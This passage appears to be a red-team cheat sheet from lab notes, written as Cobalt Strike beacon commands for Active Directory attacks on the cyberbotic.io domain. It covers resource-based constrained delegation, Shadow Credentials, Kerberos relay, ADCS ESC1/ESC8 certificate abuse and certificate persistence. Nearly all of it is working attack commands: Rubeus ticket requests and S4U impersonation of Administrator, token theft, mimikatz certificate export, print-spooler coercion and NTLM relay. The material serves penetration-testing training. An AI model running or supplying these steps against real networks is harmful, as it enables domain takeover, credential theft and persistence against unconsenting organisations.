PS&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password<span style=color:#960050;background-color:#1e0010>:</span>oIrpupAtF1YCXaw /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
  
<span style=color:#75715e>#3. Use the Hash to get TGT for our fake computer, and rest of the steps remains same, Follow case-1</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /aes256<span style=color:#960050;background-color:#1e0010>:</span>7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
</code></pre></div></li><li><p>Shadow Credentials</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Shadow Credentials</span>
  
<span style=color:#75715e>#1. Enumerate the Permissions GenericWrite/GenericAll to modify the attribute msDS-KeyCredentialLink for User or Computer Object.</span>
beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Users</span><span style=color:#e6db74>&#34;</span>}
  
beacon&gt; powerpick Get-DomainSid -Domain dev.cyberbotic.io
  
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span>}
  
beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.SecurityIdentifier <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}</span><span style=color:#e6db74>&#34;</span> }
  
beacon&gt; powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span>}
  
beacon&gt; powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty|GenericWrite|GenericAll|WriteDacl</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.SecurityIdentifier <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}</span><span style=color:#e6db74>&#34;</span> }
  
beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
  
<span style=color:#75715e>#2-a. List any keys that might already be present for a target - this is important for when we want to clean up later. (Add $ for computer objects in /target)</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target<span style=color:#960050;background-color:#1e0010>:</span>dc-2$
  
<span style=color:#75715e>#2-b. Enumerate for Users or Computers which might already be configured for Using Shadow Credentials</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(msDS-KeyCredentialLink=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(msDS-KeyCredentialLink=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
  
<span style=color:#75715e>#3. Then, Add a new key pair to the target. (Note the DeviceID GUID added. So we can remove later on.)</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target<span style=color:#960050;background-color:#1e0010>:</span>dc-2$
  
<span style=color:#75715e>#4. Check if Shadow Credential is added.</span>
<span style=color:#75715e># Using Whisker</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target<span style=color:#960050;background-color:#1e0010>:</span>dc-2$
<span style=color:#75715e># Using PowerView</span>
beacon&gt; powerpick Get-DomainUser -Identity supportXuser
beacon&gt; powerpick Get-DomainComputer -Identity dc-2
  
<span style=color:#75715e>#5. And now, we can ask for a TGT leveraging the certificate and using the Rubeus command that Whisker provides.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIIJuA[...snip...]ICB9A= /password<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>y52EhYqlfgnYPuRb</span><span style=color:#e6db74>&#34;</span> /nowrap
  
<span style=color:#75715e>#6-a. For machine account TGT , we can perform S4U2Self Abuse and get a TGS</span>
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
  
<span style=color:#75715e>#6-b. For a User Account TGT, We can just inject it by creating a sacrificial Process.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
  
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
  
<span style=color:#75715e>#7. Now we can clean Up , Whisker&#39;s clear command will remove any and all keys from msDS-KeyCredentialLink.</span>
<span style=color:#75715e>#List all the entries</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target<span style=color:#960050;background-color:#1e0010>:</span>dc-2$
<span style=color:#75715e>#Remove specific entries</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /deviceid<span style=color:#960050;background-color:#1e0010>:</span>58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
</code></pre></div></li><li><p>Kerberos Relay Attacks</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Kerberos Relay Attack (To Get Local Privilege Escalation from User to System)</span>
  
<span style=color:#75715e># 1- Configuring Cobalt Strike for Kerberos Relay Attack</span>
  
<span style=color:#75715e># 1.1 - Krbrelay uses BouncyCastle Crypto package , Which is quite large , its size is larger than the default task size allowed for beacon. Trying to run it with `execute-assembly` will throw an error.</span>
beacon&gt; execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
[-] Task size of 1727291 bytes is over the max task size limit of 1048576 bytes.
  
<span style=color:#75715e># 1.2 - To fix it we have to modify the Malleable C2 profile and double the task size tasks_max_size. Add below line to the top of your malleable C2 profile.</span>
set tasks_max_size <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>2097152</span><span style=color:#e6db74>&#34;</span>;
  
<span style=color:#75715e># After updating the C2 Profile reload the teamserver service</span>
$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl stop teamserver.service
$ sudo systemctl start teamserver.service
$ sudo systemctl enable teamserver.service
  
<span style=color:#75715e>#----------------------------------------------------------------------------------</span>
  
<span style=color:#75715e># 2- Using Kerberos Relay Attack with RBCD Abuse</span>
<span style=color:#75715e># For help Check Notes : https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</span>
  
<span style=color:#75715e># 2.1 - To abuse RBCD we must have Local System access to a Domain Computer, Same as RBCD abuse we can just create a new Computer Object and use it</span>
<span style=color:#75715e># Create a Computer object</span>
beacon&gt; execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --domain dev.cyberbotic.io
<span style=color:#75715e># Get its SID</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainComputer -Identity EvilComputer -Properties objectsid
  
<span style=color:#75715e># 2.2 - Using Checkport, find a suitable port for the OXID resolver to circumvent a check in the (RPCSS).</span>
beacon&gt; execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
  
<span style=color:#75715e># 2.3 - Run KrbRelay at that port (Using -rbcd argument)</span>
beacon&gt; execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
  
<span style=color:#75715e># 2.4 - Now, If we query  WKSTN-2$, we&#39;ll see that there&#39;s now an entry in in its  *msDS-AllowedToActOnBehalfOfOtherIdentity*  attribute.</span>
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  
<span style=color:#75715e># 2.5 - We have new added comp credentials So we can request a TGT and perform an S4U to obtain a usable service tickets (TGS) for WKSTN-2.</span>
<span style=color:#75715e># Using Machine Password to get the hash</span>
PS&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password<span style=color:#960050;background-color:#1e0010>:</span>oIrpupAtF1YCXaw /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
<span style=color:#75715e># Using hash to get the TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /aes256<span style=color:#960050;background-color:#1e0010>:</span>1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
<span style=color:#75715e># Use S4U technique to get TGS for target computer using our TGT</span>
<span style=color:#75715e># we do not use the FQDN of the target machine in the msdsspn parameter, We used host/wkstn-2.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /msdsspn<span style=color:#960050;background-color:#1e0010>:</span>host/wkstn-2 /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIF8j[...snip...]MuaW8= /ptt
  
<span style=color:#75715e># 2.6 - To perform the elevation, use this TGS to interact with the local Service Control Manager over Kerberos to create and start a service binary payload. </span>
<span style=color:#75715e># Use BOF and Aggressor Script that registers a new  elevate command in Beacon.</span>
<span style=color:#75715e># C:\Tools\SCMUACBypass and is based on James&#39; SCMUACBypass [](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)gist.</span>
beacon&gt; elevate svc-exe-krb tcp-local
  
<span style=color:#75715e>#----------------------------------------------------------------------------------</span>
  
<span style=color:#75715e># 3- Using Kerberos Relay Attack with Shadow Credential Abuse</span>
<span style=color:#75715e># The advantage of using shadow credentials over RBCD is that we don&#39;t need to add a fake computer to the domain.</span>
  
<span style=color:#75715e># 3.1 - Verify that WKSTN-2 (Target Machine) has nothing in its  msDS-KeyCredentialLink attribute.</span>
beacon&gt; execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target<span style=color:#960050;background-color:#1e0010>:</span>wkstn-2$
  
<span style=color:#75715e># 3.2 - Run KrbRelay as before (in Kerberos Relay with RBCD above), but this time   with the  -shadowcred parameter.</span>
<span style=color:#75715e># if gets error like  (0x800706D3): The authentication service is unknown. then reboot the machine</span>
beacon&gt; execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
  
<span style=color:#75715e># 3.3 - Like Whisker does, KrbRelay provides Rubeus command that will request a TGT for WKSTN-2. However, it will return an RC4 ticket so if you want an AES instead, do.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>WKSTN-2$ /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIIJyA[...snip...]QCAgfQ /password<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>06ce8e51-a71a-4e0c-b8a3-992851ede95f</span><span style=color:#e6db74>&#34;</span> /enctype<span style=color:#960050;background-color:#1e0010>:</span>aes256 /nowrap
  
<span style=color:#75715e># 3.4 - The S4U2Self trick can then be used to obtain a HOST service ticket like we did with RBCD.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>host/wkstn-2 /user<span style=color:#960050;background-color:#1e0010>:</span>wkstn-2$ /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIGkD[...snip...]5pbw== /ptt
</code></pre></div></li></ul><h3 id=active-directory-certificate-services>Active Directory Certificate Services</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Finding Certificate Authorities</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io

<span style=color:#75715e># Miconfigured Certificate template (By dafault /vulnerable parameter looks only for Domain Users group in Enrollment Rights)</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject

<span style=color:#75715e>#------------------------------------------------------------------------------------</span>
<span style=color:#75715e># ESC1 ( ENROLLEE_SUPPLIES_SUBJECT ) - Misconfigured Certificate Templates</span>

<span style=color:#75715e># 1. Find the misconfigured certificate,</span>
<span style=color:#75715e># Look for Enrollment Rights,</span>
<span style=color:#75715e># check if *ENROLLEE_SUPPLIES_SUBJECT* is enabled in property (msPKI-Certificate-Name-Flag)</span>
<span style=color:#75715e># certificate usage (pkiextendedkeyusage) has *Client Authentication* set.</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
beacon&gt; getuid
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject

<span style=color:#75715e># 2. Request a Certificate for other domain user (Domain Admin)</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca<span style=color:#960050;background-color:#1e0010>:</span>dc-2.dev.cyberbotic.io\sub-ca /template<span style=color:#960050;background-color:#1e0010>:</span>CustomUser /altname<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
<span style=color:#75715e># For OutBound Forests the Certify fails , So either use Certreq or modify the Certify Source code.</span>
- Check this <span style=color:#66d9ef>for</span> help <span style=color:#960050;background-color:#1e0010>:</span> [https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/GhostPack/Certify/issues/13<span style=color:#75715e>#issuecomment-1716046133](https://github.com/GhostPack/Certify/issues/13#issuecomment-1716046133)</span>

<span style=color:#75715e># 3. Copy the whole certificate (both the private key and certificate) and save it to .pem file. Then use openssl command to convert it to pfx format.</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft Enhanced Cryptographic Provider v1.0</span><span style=color:#e6db74>&#34;</span> -export -out cert.pfx
<span style=color:#75715e># Convert .pfx into a base64 encoded string so it can be used with Rubeus</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; cat cert.pfx | base64 -w 0

<span style=color:#75715e># 4. use asktgt to request a TGT for the user using the certificate</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>pass123 /nowrap /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIIM7w[...]ECAggA

<span style=color:#75715e># 5. Inject the TGT and look for Local Admin Access on other domain computers</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
<span style=color:#75715e># Look for Local Admin Access on other domain computers.</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Find-LocalAdminAccess -Verbose
<span style=color:#75715e># Then check if you can access anything on that machine.</span>

<span style=color:#75715e>#----------------------------------------------------------------</span>
**<span style=color:#75715e># ESC8 - NTLM Relaying to ADCS HTTP Endpoints**</span>

<span style=color:#75715e>## Prerequisite</span>
<span style=color:#75715e># If both DC and CA are setup on same machine then we wouldn’t be able to relay a DC to a CA. In that case we can use ESC8 to gain access to machine where unconstrained delegation is configured, So that we can abuse the unconstrained Delegation later on.</span>

<span style=color:#75715e># Web End point for certificate services is at http[s]://&lt;hostname&gt;/certsrv.</span>
<span style=color:#75715e># Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate</span>
<span style=color:#75715e># But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate</span>
<span style=color:#75715e># Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2</span>

<span style=color:#75715e># 1. Setup socks proxy (beacon session)</span>
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
beacon&gt; socks 8090 socks4
beacon&gt; socks stop

<span style=color:#75715e># 2. Setup Proxychains to use this proxy</span>
$ sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

<span style=color:#75715e># 3. Execute NTLMRelayx to target the certificate server endpoint</span>
<span style=color:#75715e># Find the IP of the CA (DA and CA are both same in lab).</span>
beacon&gt; powerpick Get-IPAddress -Identity dc-2
attacker@ubuntu ~&gt; sudo proxychains ntlmrelayx.py -t https<span style=color:#960050;background-color:#1e0010>:</span>//&lt;CA-ip&gt;/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
attacker@ubuntu ~&gt; sudo proxychains ntlmrelayx.py -t https<span style=color:#960050;background-color:#1e0010>:</span>//10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

<span style=color:#75715e># 4. Setup reverse port forwarding (System shell)</span>
beacon&gt; rportfwd 8445 127.0.0.1 445
beacon&gt; rportfwd stop 8445

<span style=color:#75715e># 5. Upload PortBender driver and load its cna file (System shell)</span>
beacon&gt; cd C:\Windows\system32\drivers
beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
beacon&gt; PortBender redirect 445 8445
<span style=color:#75715e># To kill portbender , Kill the job</span>
beacon&gt; jobs
beacon&gt; jobkill &lt;JID&gt;

<span style=color:#75715e># 6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)</span>
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe &lt;Unconstrained-Machine-IP&gt; &lt;Current-Machine-IP&gt;
beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

<span style=color:#75715e># 7. Use the Base64 encoded machine certificate obtained to get TGT of machine account</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>WEB$ /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIIM7w[...]ECAggA /nowrap

<span style=color:#75715e># 8. Use the TGT ticket obtained for S4U attack to get a service ticket TGS.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/web.dev.cyberbotic.io /nowrap /user<span style=color:#960050;background-color:#1e0010>:</span>WEB$ /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP

<span style=color:#75715e># 9. Inject the Service Ticket by creating a new sacrificial token</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>Administrator /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=tok

<span style=color:#75715e># 10. Steal token and access the service</span>
beacon&gt; steal_token 1234
beacon&gt; ls \\web.dev.cyberbotic.io\c$

<span style=color:#75715e># 11. Revert all the changes made during attack</span>
beacon&gt; socks stop
beacon&gt; jobs
beacon&gt; jobkill &lt;portbender-Job-ID&gt;
beacon&gt; rportfwd stop 8445

<span style=color:#75715e>#------------------------------------------------------------------------------------</span>
<span style=color:#75715e>## PERSIST-1 &amp; PERSIST-2 : User &amp; Computer Persistance</span>

<span style=color:#75715e># PERSIST-1 : User Persistance</span>

<span style=color:#75715e># 1-a. Enumerate and export user certificate from their Personal Certificate store (execute from user session)</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
<span style=color:#75715e># Export the certificate as DER and PFX file on disk</span>
beacon&gt; mimikatz crypto::certificates /export

<span style=color:#75715e># 1-b. If the user does not have a certificate in their store, we can just request one with Certify. Make sure we are in Domain user&#39;s sessions context of user for which we are requesting certificate.</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca<span style=color:#960050;background-color:#1e0010>:</span>dc-2.dev.cyberbotic.io\sub-ca /template<span style=color:#960050;background-color:#1e0010>:</span>User
<span style=color:#75715e># Save the Private And Public key both in a file with .pem extension</span>
<span style=color:#75715e># Then convert the .pem file to .pfx</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft Enhanced Cryptographic Provider v1.0</span><span style=color:#e6db74>&#34;</span> -export -out cert.pfx

<span style=color:#75715e># 2. Encode the PFX file to be used with Rubeus</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

<span style=color:#75715e># 3. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIINeg[...]IH0A== /password<span style=color:#960050;background-color:#1e0010>:</span>mimikatz /enctype<span style=color:#960050;background-color:#1e0010>:</span>aes256 /nowrap

<span style=color:#75715e># 4. Inject the User TGT and look for Local Admin access on Domain machines.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
<span style=color:#75715e># Look for Local Admin Access on other domain computers</span>
beacon&gt; powerpick Find-LocalAdminAccess -Verbose
<span style=color:#75715e># Then check if you can access anything on that machine.</span>

<span style=color:#75715e># PERSIST-2 : Computer Persistance </span>

<span style=color:#75715e># 1-a. Export the machine certificate (requires elevated session)</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
beacon&gt; mimikatz !crypto::certificates /systemstore<span style=color:#960050;background-color:#1e0010>:</span>local_machine /export
beacon&gt; download local_machine_My_0_wkstn-2.dev.cyberbotic.io.pfx

<span style=color:#75715e># 1-b. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca<span style=color:#960050;background-color:#1e0010>:</span>dc-2.dev.cyberbotic.io\sub-ca /template<span style=color:#960050;background-color:#1e0010>:</span>Machine /machine
<span style=color:#75715e># Save the Private And Public key both in a file with .pem extension</span>
<span style=color:#75715e># Then convert the .pem file to .pfx</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft Enhanced Cryptographic Provider v1.0</span><span style=color:#e6db74>&#34;</span> -export -out cert.pfx

<span style=color:#75715e># 2. Encode the certificate, and use it with Rubeus to get TGT for machine account.</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; cat /mnt/c/Users/Attacker/Desktop/local_machine_My_0_wkstn-2.dev.cyberbotic.io.pfx | base64 -w 0

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>WKSTN-1$ /enctype<span style=color:#960050;background-color:#1e0010>:</span>aes256 /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIINCA[...]IH0A== /password<span style=color:#960050;background-color:#1e0010>:</span>mimikatz /nowrap

<span style=color:#75715e># 3. Then Using S4U2Self to get the TGS from the Machine TGT.</span>
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/web.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>WEB$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>Administrator /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
